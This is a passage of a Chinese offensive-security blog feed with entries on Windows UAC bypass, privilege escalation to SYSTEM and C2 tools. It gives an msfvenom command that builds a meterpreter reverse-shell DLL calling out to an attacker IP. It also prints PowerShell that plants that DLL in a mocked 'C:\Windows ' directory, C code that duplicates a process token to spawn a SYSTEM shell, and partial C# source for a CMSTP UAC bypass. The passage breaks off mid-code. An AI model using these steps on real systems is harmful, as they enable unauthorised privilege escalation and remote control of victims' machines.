src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/027CD92635631B23E47922664D9E690A.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/C3BF73F738DBC8A00ED1ACCD6032F3B6.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAC-bypass</title>
      <link href="/UAC-bypass.html"/>
      <url>/UAC-bypass.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD8096CC13519572206A2A4D89C7F85D.jpg" alt="enter description here"></p><span id="more"></span><p>在C:\Windows\System32目录中并且AutoElevate为True的60个二进制文件中，  总共有13个可以用于带有Mocking可信目录的Hijacking DLL。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0.png" alt="enter description here"><br>以下可以看到劫持的DLL</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/210F4334-57F7-47BE-9406-A1E6A875F977.png" alt="enter description here"></p><p>以下为原理图：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0_CsILMfmzl7N2Ix4L.png" alt="enter description here"><br>msf生成dll 并开启MSF监听</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">10.0</span>.<span class="number">0.117</span> lport=<span class="number">444</span> -f dll -o comctl32.dll</span><br></pre></td></tr></table></figure><p>劫持DLL并提权<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9426BD2577476617BBE1DFDC2520A663.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base</span> = <span class="string">&quot;amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17134.1_none_e4da93291059d8fb&quot;</span></span><br><span class="line"><span class="selector-attr">[ System.io.directory]</span>::<span class="built_in">CreateDirectory</span>(<span class="string">&quot;\\?\\c:\\Windows \\&quot;</span>)</span><br><span class="line"><span class="selector-attr">[ System.io.directory]</span>:: <span class="built_in">CreateDirectory</span>(<span class="string">&quot;C:\\Windows \\System32&quot;</span>)</span><br><span class="line"><span class="selector-attr">[ System.io.file]</span>::<span class="built_in">Copy</span>( <span class="string">&quot;C:\Windows\System32\ComputerDefaults.exe&quot;</span>,<span class="string">&quot;C:\Windows \System32\ComputerDefaults.exe&quot;</span> )</span><br><span class="line"><span class="selector-attr">[ System.io.directory]</span>::<span class="built_in">CreateDirectory</span>( <span class="string">&quot;C:\\Windows \\System32\\ComputerDefaults.exe.Local&quot;</span> )</span><br><span class="line"><span class="selector-attr">[ System.io.directory]</span>::<span class="built_in">CreateDirectory</span>( <span class="string">&quot;C:\\Windows \\System32\\ComputerDefaults.exe.Local\\$base&quot;</span> )</span><br><span class="line"><span class="selector-attr">[ System.io.file]</span>::<span class="built_in">Copy</span>( <span class="string">&quot;C:\Users\demon\Desktop\comctl32.dll&quot;</span>, <span class="string">&quot;c:\\Windows \\System32\\ComputerDefaults.exe.Local\\$base\comctl32.dll&quot;</span>)</span><br><span class="line">Start-Process <span class="string">&quot;C:\Windows \System32\ComputerDefaults.exe&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.elladodelmal.com/2018/11/mocking-trusted-directory-uac-bypass-en.html">https://www.elladodelmal.com/2018/11/mocking-trusted-directory-uac-bypass-en.html</a><br><a href="https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e">https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csharp_reverse</title>
      <link href="/csharp-reverse.html"/>
      <url>/csharp-reverse.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/csharp_reverse.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<p>参考链接:</p><ul><li><p><a href="https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15">https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15</a></p></li><li><p><a href="https://gist.githubusercontent.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f/raw/7806b5c9642bdf39365c679addb28b6d19f31d76/PowerShell_Command.txt">https://gist.githubusercontent.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f/raw/7806b5c9642bdf39365c679addb28b6d19f31d76/PowerShell_Command.txt</a></p></li><li><p><a href="https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066">https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066</a></p></li></ul><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3818F11E1C36E01EA945A9E42ED0F139.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0740F77E1C6BD576C0A10E19A3DFBE04.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>trevorc2</title>
      <link href="/trevorc2.html"/>
      <url>/trevorc2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181117_082151.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/trevorc2.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/trustedsec/trevorc2">https://github.com/trustedsec/trevorc2</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1A85134715D86AF4F05183AE29EE16FD.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/042FB1B6159D3231B68165148F2C7339.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Get-system篇</title>
      <link href="/Get-system.html"/>
      <url>/Get-system.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD8096CC13519572206A2A4D89C7F85D.jpg" alt="enter description here"></p><hr><h2 id="1-Windows-API和模拟-get-system"><a href="#1-Windows-API和模拟-get-system" class="headerlink" title="1.Windows API和模拟(get-system)"></a>1.Windows API和模拟(get-system)</h2><p><a href="https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html">https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/AFF5460B36513C005C1654417475C889.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#include</span> &lt;windows.h&gt;</span><br><span class="line"><span class="selector-id">#include</span> &lt;stdio.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">HANDLE <span class="built_in">GetAccessToken</span>(DWORD pid)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Retrieves an access token for a process */</span></span><br><span class="line">HANDLE currentProcess = &#123;&#125;;</span><br><span class="line">HANDLE AccessToken = &#123;&#125;;</span><br><span class="line">DWORD LastError;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">currentProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">currentProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, TRUE, pid);</span><br><span class="line"><span class="keyword">if</span> (!currentProcess)</span><br><span class="line">&#123;</span><br><span class="line">LastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;ERROR: OpenProcess(): %d\n&quot;</span>, LastError);</span><br><span class="line">return (HANDLE)NULL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &amp;AccessToken))</span><br><span class="line">&#123;</span><br><span class="line">LastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;ERROR: OpenProcessToken(): %d\n&quot;</span>, LastError);</span><br><span class="line">return (HANDLE)NULL;</span><br><span class="line">&#125;</span><br><span class="line">return AccessToken;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="built_in">wmain</span>(int argc, WCHAR **argv)</span><br><span class="line">&#123;</span><br><span class="line">DWORD LastError;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Argument Check */</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;Usage: %ls &lt;PID&gt;\n&quot;</span>, argv<span class="selector-attr">[0]</span>);</span><br><span class="line">return <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process ID definition */</span></span><br><span class="line">DWORD pid;</span><br><span class="line">pid = <span class="built_in">_wtoi</span>(argv<span class="selector-attr">[1]</span>);</span><br><span class="line"><span class="keyword">if</span> ((pid == NULL) || (pid == <span class="number">0</span>)) return <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;[+] Pid Chosen: %d\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Retrieves the remote process token.</span></span><br><span class="line">HANDLE pToken = <span class="built_in">GetAccessToken</span>( pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//These are required to call DuplicateTokenEx.</span></span><br><span class="line">SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;</span><br><span class="line">TOKEN_TYPE tokenType = TokenPrimary;</span><br><span class="line">HANDLE pNewToken = new HANDLE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">DuplicateTokenEx</span>(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &amp;pNewToken))</span><br><span class="line">&#123;</span><br><span class="line">DWORD LastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;ERROR: Could not duplicate process token [%d]\n&quot;</span>, LastError);</span><br><span class="line">return <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;Process token has been duplicated.\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">DuplicateTokenEx</span>(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &amp;pNewToken))</span><br><span class="line">&#123;</span><br><span class="line">DWORD LastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;ERROR: Could not duplicate process token [%d]\n&quot;</span>, LastError);</span><br><span class="line">return <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;Process token has been duplicated.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Starts a new process with SYSTEM token */</span></span><br><span class="line">STARTUPINFOW si = &#123;&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;&#125;;</span><br><span class="line">BOOL ret;</span><br><span class="line">ret = <span class="built_in">CreateProcessWithTokenW</span>(pNewToken, LOGON_NETCREDENTIALS_ONLY, L<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">&#123;</span><br><span class="line">DWORD lastError;</span><br><span class="line">lastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">wprintf</span>(L<span class="string">&quot;CreateProcessWithTokenW: %d\n&quot;</span>, lastError);</span><br><span class="line">return <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是更改后的代码。</p><h2 id="2-Windows-API和模拟-powershell"><a href="#2-Windows-API和模拟-powershell" class="headerlink" title="2.Windows API和模拟(powershell)"></a>2.Windows API和模拟(powershell)</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function Get-System </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">if</span>(<span class="selector-attr">[System.Threading.Thread]</span>::CurrentThread<span class="selector-class">.GetApartmentState</span>() -ne <span class="string">&#x27;STA&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        Write-Output <span class="string">&quot;This powershell shell is not in STA mode!&quot;</span>;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">if</span>(-not (<span class="selector-attr">[System.Management.Automation.PSTypeName]</span><span class="string">&quot;zc00l.ImpersonationToken&quot;</span>).Type) &#123;</span><br><span class="line">        <span class="selector-attr">[Reflection.Assembly]</span>::<span class="built_in">Load</span>(<span class="selector-attr">[Convert]</span>::<span class="built_in">FromBase64String</span>(<span class="string">&quot;quot;</span>)) | Out-Null</span><br><span class="line">        Write-Output <span class="string">&quot;DLL has been reflected.&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">if</span>(-not <span class="selector-attr">[zc00l.ImpersonationToken]</span>::<span class="built_in">ImpersonateProcessToken</span>((Get-Process Winlogon).Id))</span><br><span class="line">    &#123;</span><br><span class="line">        Write-Output <span class="string">&quot;Could not Impersonate Token! Maybe you are not Local Admin?&quot;</span>;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Write-Output <span class="string">&quot;We are: $([Environment]::Username)&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/57EB34087172F0E676FED16A4EC0299E.jpg" alt="enter description here"></p><h2 id="3-利用ALPC-Flaw与Server-2016和Windows-10中的Diagnostics-Hub相结合"><a href="#3-利用ALPC-Flaw与Server-2016和Windows-10中的Diagnostics-Hub相结合" class="headerlink" title="3.利用ALPC Flaw与Server 2016和Windows 10中的Diagnostics Hub相结合"></a>3.利用ALPC Flaw与Server 2016和Windows 10中的Diagnostics Hub相结合</h2><p><a href="https://github.com/realoriginal/alpc-diaghub">https://github.com/realoriginal/alpc-diaghub</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/ABD6A4FD4AA3D13DB3D0AC194AA48A46.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F1B1970D92234E40267C1B68681213BF.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/45C5EC569D65D5FEEAFAB801F2DD2749.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BAB09AA80F4D9D7271037564DA7A228B.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1EAFB9F0B661F74463C15678A06B8364.jpg" alt="enter description here"></p><h2 id="4-Juicy-Potato"><a href="#4-Juicy-Potato" class="headerlink" title="4.Juicy Potato"></a>4.Juicy Potato</h2><p><a href="https://ohpe.it/juicy-potato/">https://ohpe.it/juicy-potato/</a><br><a href="https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts">https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1534722323_5b7a01139a3aa.jpg" alt="enter description here"></p><h2 id="5-MAC-OSX-get-root"><a href="#5-MAC-OSX-get-root" class="headerlink" title="5. MAC OSX (get-root)"></a>5. MAC OSX (get-root)</h2><p><a href="https://github.com/bazad/launchd-portrep">https://github.com/bazad/launchd-portrep</a><br>(修复于MAC OSX 10.14)<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/12214619EAB5188AEA5C3E0FC0C4C272.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass UAC windows defender</title>
      <link href="/bypass-UAC-Adduser.html"/>
      <url>/bypass-UAC-Adduser.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/bypass-UAC-adduser.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27630183&auto=0&height=66"></iframe><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/266B6D9FDD19272C3C9B9602A58DDE63.png" alt="enter description here"><br><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html">https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">UAC Bypass using CMSTP.exe microsoft binary</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Based on previous work from Oddvar Moe</span></span><br><span class="line"><span class="comment">https://oddvar.moe/2017/08/15/research-on-cmstp-exe/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">And this PowerShell script of Tyler Applebaum</span></span><br><span class="line"><span class="comment">https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Code author: Andre Marques (@_zc00l)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.ComponentModel;</span><br><span class="line">using System.Windows;</span><br><span class="line">using System<span class="selector-class">.Runtime</span>.InteropServices;</span><br><span class="line"></span><br><span class="line">public class CMSTPBypass</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Our .INF file data!</span></span><br><span class="line">    public static string InfData = @<span class="string">&quot;[version]</span></span><br><span class="line"><span class="string">Signature=$chicago$</span></span><br><span class="line"><span class="string">AdvancedINF=2.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[DefaultInstall]</span></span><br><span class="line"><span class="string">CustomDestination=CustInstDestSectionAllUsers</span></span><br><span class="line"><span class="string">RunPreSetupCommands=RunPreSetupCommandsSection</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[RunPreSetupCommandsSection]</span></span><br><span class="line"><span class="string">; Commands Here will be run Before Setup Begins to install</span></span><br><span class="line"><span class="string">REPLACE_COMMAND_LINE</span></span><br><span class="line"><span class="string">taskkill /IM cmstp.exe /F</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[CustInstDestSectionAllUsers]</span></span><br><span class="line"><span class="string">49000,49001=AllUSer_LDIDSection, 7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[AllUSer_LDIDSection]</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;HKLM&quot;</span><span class="string">&quot;, &quot;</span><span class="string">&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;</span><span class="string">&quot;, &quot;</span><span class="string">&quot;ProfileInstallPath&quot;</span><span class="string">&quot;, &quot;</span><span class="string">&quot;%UnexpectedError%&quot;</span><span class="string">&quot;, &quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Strings]</span></span><br><span class="line"><span class="string">ServiceName=&quot;</span><span class="string">&quot;CorpVPN&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">ShortSvcName=&quot;</span><span class="string">&quot;CorpVPN&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="selector-attr">[DllImport(<span class="string">&quot;user32.dll&quot;</span>)]</span> public static extern bool <span class="built_in">ShowWindow</span>(IntPtr hWnd, int nCmdShow);</span><br><span class="line">    <span class="selector-attr">[DllImport(<span class="string">&quot;user32.dll&quot;</span>, SetLastError = true)]</span> public static extern bool <span class="built_in">SetForegroundWindow</span>(IntPtr hWnd);</span><br><span class="line"></span><br><span class="line">    public static string BinaryPath = <span class="string">&quot;c:\\windows\\system32\\cmstp.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Generates a random named .inf file with command to be executed with UAC privileges */</span></span><br><span class="line">    public static string <span class="built_in">SetInfFile</span>(string CommandToExecute)</span><br><span class="line">    &#123;</span><br><span class="line">        string RandomFileName = Path<span class="selector-class">.GetRandomFileName</span>()<span class="selector-class">.Split</span>(Convert<span class="selector-class">.ToChar</span>(<span class="string">&quot;.&quot;</span>))<span class="selector-attr">[0]</span>;</span><br><span class="line">        string TemporaryDir = <span class="string">&quot;C:\\windows\\temp&quot;</span>;</span><br><span class="line">        StringBuilder OutputFile = new <span class="built_in">StringBuilder</span>();</span><br><span class="line">        OutputFile<span class="selector-class">.Append</span>(TemporaryDir);</span><br><span class="line">        OutputFile<span class="selector-class">.Append</span>(<span class="string">&quot;\\&quot;</span>);</span><br><span class="line">        OutputFile<span class="selector-class">.Append</span>(RandomFileName);</span><br><span class="line">        OutputFile<span class="selector-class">.Append</span>(<span class="string">&quot;.inf&quot;</span>);</span><br><span class="line">        StringBuilder newInfData = new <span class="built_in">StringBuilder</span>(InfData);</span><br><span class="line">        newInfData<span class="selector-class">.Replace</span>(<span class="string">&quot;REPLACE_COMMAND_LINE&quot;</span>, CommandToExecute);</span><br><span class="line">        File<span class="selector-class">.WriteAllText</span>(OutputFile<span class="selector-class">.ToString</span>(), newInfData<span class="selector-class">.ToString</span>());</span><br><span class="line">        return OutputFile<span class="selector-class">.ToString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static bool <span class="built_in">Execute</span>(string CommandToExecute)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">if</span>(!File<span class="selector-class">.Exists</span>(BinaryPath))</span><br><span class="line">        &#123;</span><br><span class="line">            Console<span class="selector-class">.WriteLine</span>(<span class="string">&quot;Could not find cmstp.exe binary!&quot;</span>);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder InfFile = new <span class="built_in">StringBuilder</span>();</span><br><span class="line">        InfFile<span class="selector-class">.Append</span>(<span class="built_in">SetInfFile</span>(CommandToExecute));</span><br><span class="line"></span><br><span class="line">        Console<span class="selector-class">.WriteLine</span>(<span class="string">&quot;Payload file written to &quot;</span> + InfFile<span class="selector-class">.ToString</span>());</span><br><span class="line">        ProcessStartInfo startInfo = new <span class="built_in">ProcessStartInfo</span>(BinaryPath);</span><br><span class="line">        